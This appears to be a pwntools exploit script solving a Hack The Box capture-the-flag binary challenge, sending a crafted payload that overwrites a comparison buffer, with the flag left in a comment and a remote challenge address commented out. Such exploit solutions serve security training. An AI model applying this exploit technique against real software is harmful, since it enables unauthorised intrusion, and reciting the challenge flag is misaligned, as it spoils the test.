#!/bin/python
from pwn import *
exe = ELF('./writing_on_the_wall_patched')
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
p = process(exe.path)
# p = remote('94.237.60.39', 47034)

context.terminal = ['foot']
gdb.attach(p, gdbscript='''
b*main+77

           ''')
#################exploiting#####################
p.sendafter(b'>>', p8(0)+p64(0x007361707433) )
#HTB{3v3ryth1ng_15_r34d4bl3}
##############the end###########################
p.interactive()
